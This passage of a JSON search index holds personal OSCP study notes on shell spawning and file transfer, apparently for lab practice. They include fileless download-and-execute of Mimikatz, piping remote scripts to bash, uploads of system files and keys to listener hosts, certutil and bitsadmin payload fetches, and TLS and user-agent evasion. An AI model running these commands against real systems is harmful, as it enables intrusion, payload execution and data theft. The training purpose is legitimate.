    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "¬†sh\n/bin/sh -i sh: no job control in this shell sh-4.2$ perl\nperl ‚Äîe 'exec \"/bin/sh\";' ruby\nruby -e 'exec \"/bin/sh\"' lua\nlua -e 'os.execute(\"/bin/sh\")' awk\nawk 'BEGIN {system(\"/bin/sh\")}' vim\nvim -c ':!/bin/sh' sudo -l Matching Defaults entries for apache on ILF-WebSrv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User apache may run the following commands on ILF-WebSrv: (ALL : ALL) NOPASSWD: ALL Working with Laudanum The Laudanum files can be found in the /usr/share/laudanum directory.\nANTAK webshell",
    "description": "sh\n/bin/sh -i sh: no job control in this shell sh-4.2$ perl\nperl ‚Äîe 'exec \"/bin/sh\";' ruby\nruby -e 'exec \"/bin/sh\"' lua\nlua -e 'os.execute(\"/bin/sh\")' awk\nawk 'BEGIN {system(\"/bin/sh\")}' vim\nvim -c ':!/bin/sh' sudo -l Matching Defaults entries for apache on ILF-WebSrv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User apache may run the following commands on ILF-WebSrv: (ALL : ALL) NOPASSWD: ALL Working with Laudanum The Laudanum files can be found in the /usr/share/laudanum directory.",
    "tags": [],
    "title": "spwaning shell",
    "uri": "/oscp-notes/spwaning-shell/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "BASE 64 method\nPwnbox Check SSH Key MD5 Hash Windows File Transfer Methods\ncube111@local[/local]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa Pwnbox Encode SSH Key to Base64 Windows File Transfer Methods\ncube111@local[/local]$ cat id_rsa |base64 -w 0;echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZ We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.\n[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUF Confirming the MD5 Hashes Match Windows File Transfer Methods\nPS C:\\local\u003e Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5 Algorithm Hash Path --------- ---- ---- MD5 4E301756A07DED0A2DD6953ABF015278 FILE DOWNLOAD SYNCHRONOUS AND ASYNCHRONOUS\nPS C:\\local\u003e # Example: (New-Object Net.WebClient).DownloadFile('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e') PS C:\\local\u003e (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1') PS C:\\local\u003e # Example: (New-Object Net.WebClient).DownloadFileAsync('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e') PS C:\\local\u003e (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1') PowerShell DownloadString - Fileless Method As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.\nWindows File Transfer Methods\nPS C:\\local\u003e IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') IEX also accepts pipeline input.\nPS C:\\local\u003e (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX PowerShell Invoke-WebRequest From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.\nWindows File Transfer Methods\nPS C:\\local\u003e Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1 more sophestocated methods\nhttps://gist.github.com/HarmJ0y/bb48307ffa663256e239\nCommon Errors with PowerShell This can be bypassed using the parameter -UseBasicParsing.\nWindows File Transfer Methods\nPS C:\\local\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 | IEX Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. At line:1 char:1 + Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand PS C:\\local\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 -UseBasicParsing | IEX Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:\nWindows File Transfer Methods\nPS C:\\local\u003e IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') Exception calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.\" At line:1 char:1 + IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [], MethodInvocationException + FullyQualifiedErrorId : WebException PS C:\\local\u003e [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} SMB File Transfer\ncube111@local[/local]$ sudo impacket-smbserver share -smb2support /tmp/smbshare Copy a File from the SMB Server Windows File Transfer Methods\nC:\\local\u003e copy \\\\192.168.220.133\\share\\nc.exe 1 file(s) copied. IF WINDOWS GIVES OUT PERMISSION DENIED TRY BELOW THINGS\nCreate the SMB Server with a Username and Password Windows File Transfer Methods\ncube111@local[/local]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test Mount the SMB Server with Username and Password Windows File Transfer Methods\nC:\\local\u003e net use n: \\\\192.168.220.133\\share /user:test test The command completed successfully. C:\\local\u003e copy n:\\nc.exe 1 file(s) copied. FTP FILE TARNSFER\nInstalling the FTP Server Python3 Module - pyftpdlib Windows File Transfer Methods\ncube111@local[/local]$ sudo pip3 install pyftpdlib Then we can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don‚Äôt set a user and password.\nSetting up a Python3 FTP Server Windows File Transfer Methods\ncube111@local[/local]$ sudo python3 -m pyftpdlib --port 21 [I 2022-05-17 10:09:19] concurrency model: async [I 2022-05-17 10:09:19] masquerade (NAT) address: None [I 2022-05-17 10:09:19] passive ports: None [I 2022-05-17 10:09:19] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=3210 \u003c\u003c\u003c IF Shell is not interactive\nCreate a Command File for the FTP Client and Download the Target File Windows File Transfer Methods\nC:\\local\u003e echo open 192.168.49.128 \u003e ftpcommand.txt C:\\local\u003e echo USER anonymous \u003e\u003e ftpcommand.txt C:\\local\u003e echo binary \u003e\u003e ftpcommand.txt C:\\local\u003e echo GET file.txt \u003e\u003e ftpcommand.txt C:\\local\u003e echo bye \u003e\u003e ftpcommand.txt C:\\local\u003e ftp -v -n -s:ftpcommand.txt ftp\u003e open 192.168.49.128 Log in with USER and PASS first. ftp\u003e USER anonymous ftp\u003e GET file.txt ftp\u003e bye C:\\local\u003emore file.txt This is a test file ************FILE¬†uploads***********\nPS C:\\local\u003e [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte)) IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= PS C:\\local\u003e Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash Hash ---- 3688374325B992DEF12793500307566D cube111@local[/local]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d \u003e hosts cube111@local[/local]$ md5sum hosts 3688374325b992def12793500307566d hosts if error\n$b64 = [System.Convert]::ToBase64String((Get-Content -Path ‚ÄòC:\\Windows\\System32\\drivers\\etc\\hosts‚Äô -AsByteStream))\npowershell file uploads\nserver :\nWindows File Transfer Methods\ncube111@local[/local]$ pip3 install uploadserver Collecting upload server Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB) Installing collected packages: uploadserver Successfully installed uploadse cube111@local[/local]$ python3 -m uploadserver File upload available at /upload Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Now we can use a PowerShell script PSUpload.ps1\nPS C:\\local\u003e IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1') PS C:\\local\u003e Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\\Windows\\System32\\drivers\\etc\\hosts [+] File Uploaded: C:\\Windows\\System32\\drivers\\etc\\hosts [+] FileHash: 5E7241D66FD77E9E8EA866B6278B2373 ÓÇ∂Óò™ cube ÓÇ∞ ÔÅª Ó™ú Ó¨Ü\\OneDrive\\Desktop\\Desktop ÓÇ∞ ÓÆ¢ 6m 29.251s ÓÇ∞ ÔÄó 4:34 PM ÓÇ∞ Ôë© ÓÇ¥\n‚ö°shaik ‚ùØ‚ùØ invoke-fileupload\ncmdlet Invoke-FileUpload at command pipeline position 1\nSupply values for the following parameters:\nFile: .\\myVm_key.pem\nUri: http://20.42.93.253:2121/upload\n[+] File Uploaded: C:\\Users\\shaik\\OneDrive\\Desktop\\Desktop\\myVm_key.pem\n[+] FileHash: 25F2CBF078A553BF8508CACBF1B86CEF\nnetcat base64 file upload using invoke-webrequest\nPS C:\\local\u003e $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte)) PS C:\\local\u003e Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64 $b64 = [System.Convert]::ToBase64String((Get-Content -Path ‚ÄòC:\\Windows\\System32\\drivers\\etc\\hosts‚Äô -AsByteStream))\nuploads SMB using webdav smb over http\ncube111@local[/local]$ sudo pip3 install wsgidav cheroot [sudo] password for plaintext: Collecting wsgidav Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB) |‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà| 171 kB 1.4 MB/s ...SNIP... cube111@local[/local]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous [sudo] password for plaintext: Running without configuration file. 10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping. 10:02:53.950 - INFO : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31 10:02:53.950 - INFO : Lock manager: LockManager(LockStorageDict) 10:02:53.950 - INFO : Property manager: None 10:02:53.950 - INFO : Domain controller: SimpleDomainController() 10:02:53.950 - INFO : Registered DAV providers by route: 10:02:53.950 - INFO : - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous) 10:02:53.950 - INFO : - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous) 10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL. 10:02:53.950 - WARNING : Share '/' will allow anonymous write access. 10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access. 10:02:54.194 - INFO : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2 10:02:54.194 - INFO : Serving on http://0.0.0.0:80 ... cinnectt to shares\nC:\\local\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\ C:\\local\u003e copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\ ftp file uploads\ncube111@local[/local]$ sudo python3 -m pyftpdlib --port 21 --write (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts') C:\\local\u003e echo open 192.168.49.128 \u003e ftpcommand.txt C:\\local\u003e echo USER anonymous \u003e\u003e ftpcommand.txt C:\\local\u003e echo binary \u003e\u003e ftpcommand.txt C:\\local\u003e echo PUT c:\\windows\\system32\\drivers\\etc\\hosts \u003e\u003e ftpcommand.txt C:\\local\u003e echo bye \u003e\u003e ftpcommand.txt C:\\local\u003e ftp -v -n -s:ftpcommand.txt ftp\u003e open 192.168.49.128 Log in with USER and PASS first. ftp\u003e USER anonymous ftp\u003e PUT c:\\windows\\system32\\drivers\\etc\\hosts ftp\u003e bye File Encryption on Windows https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions\\Invoke-AESEncryption.ps1\nInvoke-AESEncryption.ps1 PS C:\\local\u003e Import-Module .\\Invoke-AESEncryption.ps1 PS C:\\local\u003e Invoke-AESEncryption -Mode Encrypt -Key \"p4ssw0rd\" -Path .\\scan-results.txt File encrypted to C:\\local\\scan-results.txt.aes",
    "description": "BASE 64 method\nPwnbox Check SSH Key MD5 Hash Windows File Transfer Methods\ncube111@local[/local]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa Pwnbox Encode SSH Key to Base64 Windows File Transfer Methods\ncube111@local[/local]$ cat id_rsa |base64 -w 0;echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZ We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.\n[IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUF Confirming the MD5 Hashes Match Windows File Transfer Methods\nPS C:\\local\u003e Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5 Algorithm Hash Path --------- ---- ---- MD5 4E301756A07DED0A2DD6953ABF015278 FILE DOWNLOAD SYNCHRONOUS AND ASYNCHRONOUS",
    "tags": [],
    "title": "File transfers windows",
    "uri": "/oscp-notes/file-transfers-windows/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "nc\ncube111@local[/local]$ sudo nc -l -p 443 -q 0 \u003c SharpKatz.exe victim@target:~$ # Example using Original Netcat victim@target:~$ nc -l -p 8000 \u003e SharpKatz.exe ncat\ncube111@local[/local]$ sudo ncat -l -p 443 --send-only \u003c SharpKatz.exe victim@target:~$ ncat 192.168.49.128 443 --recv-only \u003e SharpKatz.exe /dev/TCP/.\ncube111@local[/local]$ sudo nc -l -p 443 -q 0 \u003c SharpKatz.exe victim@target:~$ cat \u003c /dev/tcp/192.168.49.128/443 \u003e SharpKatz.exe \u0026#WINDOWS\nFile transfer via WINRM port 5984\ncheck of winrm is running\nPS C:\\local\u003e Test-NetConnection -ComputerName DATABASE01 -Port 5985 ComputerName : DATABASE01 RemoteAddress : 192.168.1.101 RemotePort : 5985 InterfaceAlias : Ethernet0 SourceAddress : 192.168.1.100 TcpTestSucceeded : True Create a PowerShell Remoting Session to DATABASE01 Miscellaenous File Transfer Methods\nPS C:\\local\u003e $Session = New-PSSession -ComputerName DATABASE01 Copy samplefile.txt from our Localhost to the DATABASE01 Session Miscellaenous File Transfer Methods\nPS C:\\local\u003e Copy-Item -Path C:\\samplefile.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\ opy DATABASE.txt from DATABASE01 Session to our Localhost Miscellaenous File Transfer Methods\nPS C:\\local\u003e Copy-Item -Path \"C:\\Users\\Administrator\\Desktop\\DATABASE.txt\" -Destination C:\\ -FromSession $Sessio RDP Mounting a Linux Folder Using rdesktop Miscellaenous File Transfer Methods\ncube111@local[/local]$ rdesktop 10.10.10.132 -d local -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files' Mounting a Linux Folder Using xfreerdp Miscellaenous File Transfer Methods\ncube111@local[/local]$ xfreerdp /v:10.10.10.132 /d:local /u:administrator /p:'Password0@' /dynamic-resolution /drive:linux,/home/plaintext/local/academy/filetransfer Alternatively, from Windows, the native mstsc.exe remote desktop client can be used.",
    "description": "nc\ncube111@local[/local]$ sudo nc -l -p 443 -q 0 \u003c SharpKatz.exe victim@target:~$ # Example using Original Netcat victim@target:~$ nc -l -p 8000 \u003e SharpKatz.exe ncat\ncube111@local[/local]$ sudo ncat -l -p 443 --send-only \u003c SharpKatz.exe victim@target:~$ ncat 192.168.49.128 443 --recv-only \u003e SharpKatz.exe /dev/TCP/.\ncube111@local[/local]$ sudo nc -l -p 443 -q 0 \u003c SharpKatz.exe victim@target:~$ cat \u003c /dev/tcp/192.168.49.128/443 \u003e SharpKatz.exe \u0026#WINDOWS\nFile transfer via WINRM port 5984\ncheck of winrm is running",
    "tags": [],
    "title": "file transfer using nc_ncat and rdp_winrm",
    "uri": "/oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "PS C:\\Users\\shaik\u003e [Convert]::ToBase64String([System.IO.File]::ReadAllBytes(‚ÄúC:\\Windows\\System32\\drivers\\etc\\hosts‚Äù)) | Set-Content ‚Äú.\\file‚Äù\nCERTREQ\nCertReq -Post -config https://www.example.org/file.ext C:\\Windows\\Temp\\file.ext cube111@local[/local]$ sudo nc -lvnp 8000 BITSADMIN\nPS C:\\local\u003e bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\local-student\\Desktop\\nc.exe PS C:\\local\u003e Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\" Certutil - Client C:\\local\u003e certutil -urlcache -split -f http://10.10.10.32/nc.exe C:\\local\u003e certutil -verifyctl -split -f http://10.10.10.32/nc.exe LINUX\nopenssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem Stand up the Server in our Pwnbox Living off The Land\ncube111@local[/local]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem \u003c /tmp/LinEnum.sh Download File from the Compromised Machine Living off The Land\ncube111@local[/local]$ openssl s_client -connect 10.10.10.32:80 -quiet \u003e LinEnum.sh USER AGENT DETECTION BYPASS\niwr http://34.23.169.205:40000/server.pem -Headers @{‚ÄúUser-Agent‚Äù = ‚ÄúMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36‚Äù}\nBITS - Client Detection\nPS C:\\local\u003e Import-Module bitstransfer; PS C:\\local\u003e Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\\t; PS C:\\local\u003e $r=gc $env:temp\\t; PS C:\\local\u003e rm $env:temp\\t; PS C:\\local\u003e iex $r BITS - Server Detection\nHEAD /nc.exe HTTP/1.1 Connection: Keep-Alive Accept: */* Accept-Encoding: identity User-Agent: Microsoft BITS/7.8 Certutil - Client Detection\nC:\\local\u003e certutil -urlcache -split -f http://10.10.10.32/nc.exe C:\\local\u003e certutil -verifyctl -split -f http://10.10.10.32/nc.exe Certutil - Server Detection\nGET /nc.exe HTTP/1.1 Cache-Control: no-cache Connection: Keep-Alive Pragma: no-cache Accept: */* User-Agent: Microsoft-CryptoAPI/10.0 MSXML2\nMsxml2 - Client Detection\nPS C:\\local\u003e $h=New-Object -ComObject Msxml2.XMLHTTP; PS C:\\local\u003e $h.open('GET','http://10.10.10.32/nc.exe',$false); PS C:\\local\u003e $h.send(); PS C:\\local\u003e iex $h.responseText PS C:\\local\u003e $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome PS C:\\local\u003e Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile \"C:\\Users\\Public\\nc.exe\" PS C:\\local\u003e GfxDownloadWrapper.exe \"http://10.10.10.132/mimikatz.exe\" \"C:\\Temp\\nc.exe\"",
    "description": "PS C:\\Users\\shaik\u003e [Convert]::ToBase64String([System.IO.File]::ReadAllBytes(‚ÄúC:\\Windows\\System32\\drivers\\etc\\hosts‚Äù)) | Set-Content ‚Äú.\\file‚Äù\nCERTREQ\nCertReq -Post -config https://www.example.org/file.ext C:\\Windows\\Temp\\file.ext cube111@local[/local]$ sudo nc -lvnp 8000 BITSADMIN\nPS C:\\local\u003e bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\\Users\\local-student\\Desktop\\nc.exe PS C:\\local\u003e Import-Module bitstransfer; Start-BitsTransfer -Source \"http://10.10.10.32:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\" Certutil - Client C:\\local\u003e certutil -urlcache -split -f http://10.10.10.32/nc.exe C:\\local\u003e certutil -verifyctl -split -f http://10.10.10.32/nc.exe LINUX\nopenssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem Stand up the Server in our Pwnbox Living off The Land",
    "tags": [],
    "title": "living off the land file transfer",
    "uri": "/oscp-notes/living-off-the-land-file-transfer/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Python Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. Python can run one-liners from an operating system command line using the option -c. Let‚Äôs see some examples:\nPython 2 - Download Transferring Files with Code\ncube111@local[/local]$ python2.7 -c 'import urllib;urllib.urlretrieve (\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")' Python 3 - Download Transferring Files with Code\ncube111@local[/local]$ python3 -c 'import urllib.request;urllib.request.urlretrieve(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"LinEnum.sh\")' PHP PHP is also very prevalent and provides multiple file transfer methods. According to W3Techs‚Äô data, PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.\nLet‚Äôs see some examples of downloading files using PHP.\nIn the following example, we will use the PHP file_get_contents() module to download content from a website combined with the file_put_contents() module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option -r.\nPHP Download with File_get_contents() Transferring Files with Code\ncube111@local[/local]$ php -r '$file = file_get_contents(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);' An alternative to file_get_contents() and file_put_contents() is the fopen() module. We can use this module to open a URL, read it‚Äôs content and save it into a file.\nPHP Download with Fopen() Transferring Files with Code\ncube111@local[/local]$ php -r 'const BUFFER = 1024; $fremote = fopen(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\", \"rb\"); $flocal = fopen(\"LinEnum.sh\", \"wb\"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);' We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.\nPHP Download a File and Pipe it to Bash Transferring Files with Code\ncube111@local[/local]$ php -r '$lines = @file(\"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh\"); foreach ($lines as $line_num =\u003e $line) { echo $line; }' | bash Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.\nOther Languages Ruby and Perl are other popular languages that can also be used to transfer files. These two programming languages also support running 